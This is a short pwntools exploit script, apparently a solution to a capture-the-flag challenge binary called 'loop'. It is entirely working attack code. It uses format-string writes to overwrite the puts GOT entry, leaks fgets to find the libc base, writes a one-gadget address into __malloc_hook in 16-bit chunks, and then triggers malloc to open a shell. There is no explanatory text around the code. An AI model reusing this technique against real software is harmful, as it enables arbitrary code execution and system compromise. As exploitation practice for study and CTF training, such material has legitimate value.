from pwn import *


elf = ELF("loop")
libc = elf.libc
p = process("./loop")

payload = b"%2053c%18$hn"
payload += b"\x00"*(48 - len(payload))
payload += p64(elf.got['puts'])
p.sendlineafter(b"? ", payload)

payload = b"%18$s"
payload += b"\x00"*(48 - len(payload))
payload += p64(elf.got['fgets'])
p.sendlineafter(b"? ", payload)
p.recvuntil(b"Hello ")
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['fgets']
log.info("libc: "+hex(libc.address))

addr = libc.symbols['__malloc_hook']
target = libc.address + 0x4f322 # one shot
count = 0
while target:
	payload = '%{}c%18$hn'.format(target & 0xffff)
	payload = payload.encode("utf-8")
	payload += b'\x00' * (48 - len(payload))
	payload += p64(addr)
	p.sendlineafter(b'name? ', payload)
	addr += 2
	target >>= 16
	count += 1
p.sendlineafter(b'name? ', b'%66000c')

p.interactive()